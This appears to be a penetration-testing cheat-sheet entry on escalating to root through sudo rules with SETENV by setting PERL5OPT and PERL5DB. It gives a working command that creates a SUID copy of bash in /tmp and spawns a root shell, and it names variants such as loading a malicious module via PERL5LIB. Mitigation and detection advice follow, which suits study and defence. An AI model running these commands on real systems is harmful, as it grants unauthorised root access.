---
topic: Perl — environment variables with sudo SETENV
tags: [linux, perl, sudo, setenv, perl5opt, privesc]
---

# Perl — environment variables with sudo SETENV

**English** | [🌐 Español](perl-env-sudo.md)

## Concept

When sudoers includes `SETENV`, the user can preserve environment variables while running a binary. If that binary is a Perl script or calls one, `PERL5OPT` and `PERL5DB` enable the debugger and run code before the program.

## When it applies

- The sudo rule shows `SETENV`.
- The executed script uses Perl or calls `xml_pp`/another Perl program.
- `PERL5OPT`/`PERL5DB` are not cleared.

## Procedure

1. Confirm the rule and interpreter.
2. Test `PERL5OPT=-d` with a harmless command.
3. Use `PERL5DB` to copy bash and set SUID.
4. Run the resulting shell.

## Commands

```bash
sudo PERL5OPT=-d PERL5DB='system("cp /bin/bash /tmp/root; chmod 6777 /tmp/root")' /opt/monitor.sh
/tmp/root -p
```

## Variants

- `PERL5LIB` to load a malicious module.
- `PERL5OPT=-M...` to import code.
- Scripts calling Perl without `env -i`.

## Limitations

- Without `SETENV`, sudo clears the environment.
- The script may `unset PERL5OPT` before Perl.
- A jail or SELinux may block the write.

## Mitigation

- Do not use `SETENV` in sudo rules.
- Clear `PERL5OPT`, `PERL5DB`, `PERL5LIB` and `LD_PRELOAD`.
- Run scripts with `env -i` and absolute paths.

## Detection

- `PERL5OPT` or `PERL5DB` on the command line.
- SUID shells created by a root script.
- Perl runs from monitoring scripts.

## References

- [0xdf — Clicker](https://0xdf.gitlab.io/2024/01/27/htb-clicker.html)
- [Perl — PERL5OPT](https://perldoc.perl.org/perlrun#PERL5OPT)
- [GTFOBins — Perl](https://gtfobins.github.io/gtfobins/perl/)
